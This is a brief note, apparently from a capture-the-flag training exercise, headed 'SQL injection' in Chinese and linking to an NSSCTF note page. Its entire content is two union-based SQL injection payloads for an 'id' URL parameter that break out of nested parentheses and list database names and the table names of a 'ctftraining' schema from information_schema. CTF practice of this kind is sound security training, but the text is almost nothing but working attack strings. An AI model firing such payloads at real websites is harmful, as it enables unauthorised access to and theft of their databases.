#SQL 注入

```sql
?id=-1)))))) union select schema_name,2 from information_schema.schemata%23


?id=-1)))))) union select group_concat(table_name),2 from information_schema.tables where table_schema='ctftraining'%23

```

https://www.nssctf.cn/note/set/2169
